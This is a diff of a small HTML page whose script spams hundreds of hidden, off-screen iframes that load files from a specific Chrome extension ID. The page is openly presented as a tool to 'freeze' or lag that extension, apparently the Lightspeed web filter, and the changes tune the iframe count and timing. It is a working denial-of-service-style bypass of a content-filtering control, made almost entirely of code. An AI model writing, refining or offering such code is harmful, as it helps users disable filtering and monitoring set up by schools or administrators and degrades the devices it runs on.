@@ -1,37 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Freeze Lightspeed</title>
+  <title>Lightspeed Freeze (Heavy Lag)</title>
 </head>
-<body style="background:black; color:white; padding:20px;">
-  <h1>⚠️ Launching Lightspeed Freeze</h1>
-  <button onclick="triggerFreeze()">🔥 Freeze Now</button>
+<body style="background:black; color:white; font-family:monospace; padding: 20px;">
+  <h1>⚠️ Lightspeed Heavy Lag Activated</h1>
+  <button onclick="startLag()">Start Heavy Lag</button>
 
   <script>
-    const extensionId = "ehnniokiiebpinnfegpkdlcamgdcaaje"; // Use latest ID if known
+    const extensionId = "ehnniokiiebpinnfegpkdlcamgdcaaje"; // Update if needed
     const files = ["background.js", "popup.html", "manifest.json", "icon-128.png"];
+    const totalSpam = 600;  // Number of iframes to create
+    const spamDelay = 5;    // Delay in milliseconds between iframes
 
-    function triggerFreeze() {
+    function startLag() {
       let count = 0;
-      const max = 500;
-      const delay = 1;
 
       const interval = setInterval(() => {
-        if (count >= max) return clearInterval(interval);
+        if (count >= totalSpam) {
+          clearInterval(interval);
+          console.log("✅ Heavy lagging complete");
+          return;
+        }
 
+        const file = files[Math.floor(Math.random() * files.length)];
         const iframe = document.createElement("iframe");
+        iframe.src = `chrome-extension://${extensionId}/${file}?r=${Math.random()}`;
         iframe.style.width = "1px";
         iframe.style.height = "1px";
         iframe.style.position = "absolute";
         iframe.style.left = "-9999px";
 
-        const file = files[Math.floor(Math.random() * files.length)];
-        iframe.src = `chrome-extension://${extensionId}/${file}?r=${Math.random()}`;
         document.body.appendChild(iframe);
-        setTimeout(() => iframe.remove(), 1500);
+
+        setTimeout(() => {
+          if (iframe.parentElement) iframe.remove();
+        }, 1000);
 
         count++;
-      }, delay);
+      }, spamDelay);
     }
   </script>
 </body>
